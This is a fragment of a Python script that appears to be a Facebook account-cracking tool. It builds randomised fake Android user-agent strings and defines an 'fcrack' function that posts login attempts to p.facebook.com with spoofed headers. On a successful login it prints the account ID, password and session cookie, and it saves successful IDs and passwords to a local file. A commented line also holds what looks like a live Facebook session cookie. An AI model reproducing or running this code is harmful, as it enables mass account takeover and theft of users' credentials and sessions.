...
BA = '\x1b[1;100m' # BELAKANG RX U RX U
my_color = [
 P, M, H, K, B, U, O, N]
...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
   ...
   #NEW#AGENT
    ...
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IRX /FB4A;FBAV/391.1.0.37.104;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
...
def fcrack(uid,pwx,tl):
    ...
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryJsKkwMByArJ4ObDO',
    # 'cookie': 'datr=ZQaoZGZvVkxUgR33aJ--Pv3q;sb=ZQaoZAYNTD4dSRu5xy_ziSs4;m_pixel_ratio=1.5625;dnonce=AWn-X0jdohNuGZ5W0RplwJBxnWSh8DgJIdEoNUZu7zCUVtzG1HFp2Eunm3wKqlXMCtg8BdkTFIm3BEdTJQNOyAX1;fr=0Yy5sEjIRu8H6yzH9.AWUwKQpn1Pj2bj7NQAfXRpixgJA.BkqAZl.tt.AAA.0.0.BkqAgv.AWXmTK4NkDs;c_user=100090890796997;xs=34%3AbooQ2Urrn3kVsg%3A2%3A1688733743%3A-1%3A409;m_page_voice=100090890796997;wd=461x886;locale=en_US;fbl_st=101137373%3BT%3A28145562;wl_cbv=v2%3Bclient_version%3A2284%3Btimestamp%3A1688733749;fbl_cs=AhAG11Bl4zfuMJ2XMpVEuJpFGFJGcE1pYTdXbmJ4bnVYOUV5WWk1elJTdg;fbl_ci=639736124881673;vpd=v1%3B691x461x1.5625;
    'origin': 'https://p.facebook.com',
    'referer': 'https://p.facebook.com/?stype=lo&jlou=AfeBpFDs15hQiJfazSqrRvVm6DlNHsvtyFsqh56OIGHMqh-EPSnxQN3EM7B2cRzwJ3L9GvbbBsPGj447XinGyEnqvRh6RTPeS5qQY7pLbgN7aw&smuh=29110&lh=Ac9myOGxp-uwc8ynEKY&wtsid=rdr_0UgyNGo13m5gxY7jZ&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-asbd-id': '129477',
    'x-fb-lsd': 'AVofzSmCp5Y',
 ...
 'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RX ASHIK-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('RX ASHIK-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mRX ASHIK\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
